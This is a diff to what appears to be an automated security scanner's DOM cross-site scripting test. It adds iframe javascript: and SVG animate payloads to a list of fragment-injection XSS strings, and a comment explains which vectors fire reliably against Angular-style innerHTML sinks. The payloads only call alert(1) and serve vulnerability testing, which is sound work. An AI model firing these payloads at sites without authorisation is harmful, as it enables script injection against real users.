@@ -815,10 +815,15 @@ async def custom_xss_test(url: str, auth_session: Any | None = None) -> dict:
     if is_hash_route and frag_params and not HAS_XSS_PROOF:
         print(f"[xss] Skipping hash route DOM XSS tests: Playwright not available", file=sys.stderr)
     elif is_hash_route and frag_params and HAS_XSS_PROOF and prove_xss_headless:
-        # DOM XSS payloads specifically for fragment injection
+        # DOM XSS payloads for fragment injection. The iframe javascript: vector is
+        # first because it fires synchronously on render and survives Angular-style
+        # innerHTML sinks (the canonical SPA search/hash-route DOM XSS) — the others
+        # depend on an async image/SVG load that may not fire under headless timing.
         DOM_XSS_PAYLOADS = [
+            ('<iframe src="javascript:alert(1)">', "iframe_js"),
             ("<img src=x onerror=alert(1)>", "img_onerror"),
             ("<svg onload=alert(1)>", "svg_onload"),
+            ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "svg_animate"),
             ("'-alert(1)-'", "js_expression"),
             ("\"><img src=x onerror=alert(1)>", "attr_break_img"),
         ]
